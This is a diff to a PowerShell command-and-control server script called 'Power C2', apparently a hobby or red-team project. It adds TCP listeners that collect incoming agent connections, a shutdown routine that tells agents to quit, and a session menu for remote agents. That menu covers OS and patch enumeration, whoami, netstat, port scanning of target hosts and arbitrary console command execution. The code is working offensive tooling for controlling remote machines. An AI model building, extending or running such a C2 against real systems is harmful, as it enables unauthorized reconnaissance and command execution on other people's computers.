@@ -57,8 +57,10 @@ $SESSION_CMDS = @{}
 $ACTIVE_LISTENERS = New-Object System.Collections.ArrayList
 $ACTIVE_CLIENTS = New-Object System.Collections.ArrayList
 $ACTIVE_RUNSPACES = New-Object System.Collections.ArrayList
+$ACTIVE_PROCS = New-Object System.Collections.ArrayList
 
-
+# Listen on a port for a client. Upon connection, add them to 
+# a list of clients.
 $CLIENT_FINDER = {
 
     if ($listener -eq $null)
@@ -85,10 +87,22 @@ $CLIENT_FINDER = {
     }
 }
 
+# Gracefully close each listener, client connection, and runspace.
 function ExitC2()
 {
     Write-Host ""
     Write-Host -ForegroundColor Red "Exiting Application..."
+
+    foreach ($l in $ACTIVE_CLIENTS)
+    {
+        if ($l -ne $null)
+        {
+            $stream = $l.GetStream()
+            SendMessage $stream "quit"
+            $stream.Dispose() > $null
+            $l.Dispose() > $null
+        }
+    }
 
     foreach ($l in $ACTIVE_LISTENERS)
     {
@@ -105,36 +119,38 @@ function ExitC2()
     {
         if ($l -ne $null)
         {
-            #Write-Host -ForegroundColor Yellow "Stopping runspace"
             $l.Dispose() > $null
         }
     }
 
-    foreach ($l in $ACTIVE_CLIENTS)
+    foreach ($l in $ACTIVE_PROCS)
     {
         if ($l -ne $null)
         {
-            $stream = $l.GetStream()
-            SendMessage $stream "quit"
-            $stream.Dispose() > $null
             $l.Dispose() > $null
         }
     }
+
+
 
     exit 1 > $null
 }
 
+# Display options for menu commands
 function MenuHelp()
 {
     Write-Host "`n"
-    $MENU_CMDS.GetEnumerator() | % { $_.Key + "`t | `t" + $_.Value }
+    $out = $MENU_CMDS.GetEnumerator() | % { $_.Key + "`t | `t" + $_.Value } | Out-String
+    Write-Host -Foreground Yellow $out
     Write-Host "`n"
 }
 
+# Display options for session commands
 function SessionHelp()
 {
     Write-Host "`n"
-    $SESSION_CMDS.GetEnumerator() | % { $_.Key + "`t | `t" + $_.Value }
+    $out = $SESSION_CMDS.GetEnumerator() | % { $_.Key + "`t | `t" + $_.Value } | Out-String
+    Write-Host -Foreground Yellow $out
     Write-Host "`n"
 }
 
@@ -153,26 +169,32 @@ function AddListener($port)
     $runSpace.SessionStateProxy.SetVariable("Listener", $listener)
     $PS = [PowerShell]::Create()
     $PS.Runspace = $runSpace
-    $PS.AddScript($CLIENT_FINDER).BeginInvoke()
-    $ACTIVE_RUNSPACES.Add($runSpace)
+    $PS.AddScript($CLIENT_FINDER).BeginInvoke() > $null
+    $ACTIVE_RUNSPACES.Add($runSpace) > $null
+    $ACTIVE_PROCS.Add($PS) > $null
 }
 
+# List the currently active sessions connected to this server.
 function ListShells()
 {
+    Write-Host ""
     $i = 0
+
+    Write-Host -ForegroundColor Cyan "#`t IP Address`t   Port"
     foreach ($t in $ACTIVE_CLIENTS)
     {
         if ($t -ne $null)
         {
             if ($t.GetType() -eq [System.Net.Sockets.TcpClient])
             {
-                Write-Host -Foreground Yellow "$i`t" $t.Client.RemoteEndPoint.Address ":" $t.Client.RemoteEndPoint.Port
+                Write-Host -Foreground Yellow "$i`t"$t.Client.RemoteEndPoint.Address" "$t.Client.LocalEndPoint.Port
                 $i++
             }
         }
     }
 }
 
+# List the currently active listeners on this server.
 function ListListeners()
 {
     Write-Host -Foreground Cyan "`nListing active listeners`n"
@@ -185,6 +207,7 @@ function ListListeners()
     }
 }
 
+# Send a message over a data stream to a client.
 function SendMessage($stream, $msg)
 {
     $data = [text.Encoding]::Ascii.GetBytes($msg)
@@ -192,6 +215,7 @@ function SendMessage($stream, $msg)
     $stream.Flush()
 }
 
+# Receive a message over a data stream, and return it.
 function ReceiveData($stream, $buffer)
 {
     do {
@@ -258,7 +282,7 @@ function UseShell($num)
 # For some fun in loading
 function Dot()
 {
-    Start-Sleep -m 100
+    Start-Sleep -m 40
     Write-Host -ForegroundColor Yellow -NoNewLine "."
 }
 
@@ -267,26 +291,28 @@ function InitMenu()
 {
     Write-Host ""
     Write-Host -ForegroundColor Yellow -NoNewLine "Initializing Shell"
-    
+
     Dot
-    $MENU_CMDS.Add("HELP    ", "Lists commands available on the current menu")
+    $MENU_CMDS.Add("HELP    ", "Lists commands available on the current menu.")
+    $MENU_CMDS.Add("LISTEN x", "Sets up a listener on port x.")
+    $MENU_CMDS.Add("SESSIONS", "Lists the shells available from hosts connected to the server.")
+    $MENU_CMDS.Add("QUIT    ", "Exit the application.")
+    $MENU_CMDS.Add("USE x   ", "Select an active session to use and switch to its context.")
     Dot
-    $MENU_CMDS.Add("LISTEN x", "Sets up a listener on port x")
+    $SESSION_CMDS.Add("HELP    ", "Lists commands available on the current menu.")
+    $SESSION_CMDS.Add("LS      ", "Lists current directory C2 agent is running from.")
+    $SESSION_CMDS.Add("EXIT    ", "Exit from the current session, and exit the agent running on the client.")
+    $SESSION_CMDS.Add("PWD     ", "Print the present working directory which the C2 Agent is running from.")
+    $SESSION_CMDS.Add("CD <TARGET>", "Change directories, according to the target name. .. specifies the parent directory.")
+    $SESSION_CMDS.Add("GETOS      ", "Get all infomration about the operating system.")
+    $SESSION_CMDS.Add("GETPATCH   ", "Retrieve information available from the operating system about the current patches/hotfixes installed.")
+    $SESSION_CMDS.Add("WHOAMI     ", "Return the account under which the C2 Agent is running.")
+    $SESSION_CMDS.Add("NETSTAT    ", "List the active network connections on the computer running the C2 Agent.")
+    $SESSION_CMDS.Add("SCAN *     ", "Run a port scan on target hosts. Parameters are: -Hosts IP -Ports PORT1, PORT2.")
+    $SESSION_CMDS.Add("CONSOLE *  ", "Run a command in the console native to the OS which is hosting the C2 Agent.")
+    $SESSION_CMDS.Add("QUIT       ", "Exit the current session, and close the connection with the C2 Agent.")
+    $SESSION_CMDS.Add("RET        ", "Return from the current session, and leave the connection with the C2 Agent active.")
     Dot
-    $MENU_CMDS.Add("SESSIONS", "Lists the shells available from hosts connected to the server")
-    Dot
-    $MENU_CMDS.Add("QUIT    ", "Exit the application")
-    Dot
-    $MENU_CMDS.Add("USE x   ", "Select an active session to use and switch to its context")
-    Dot
-    $SESSION_CMDS.Add("HELP    ", "Lists commands available on the current menu")
-    Dot
-    $SESSION_CMDS.Add("LS      ", "Lists current directory C2 agent is running from")
-    Dot
-    $SESSION_CMDS.Add("EXIT    ", "Exit from the current session, and exit the agent running on the client")
-    Dot
-    $SESSION_CMDS.Add("RETURN  ", "Return from the current session")
-    #$SESSION_CMDS.Add("LS      ", "Lists current directory C2 agent is running from")
 
     Write-Host -ForegroundColor Green "OK`n"
 
@@ -299,8 +325,6 @@ function InitMenu()
 
     Write-Host -Foreground Yellow "Welcome to Power C2"
     Write-Host -Foreground Yellow "Type HELP to list the commands available"
-
-    $con = 0
 
     do
     {
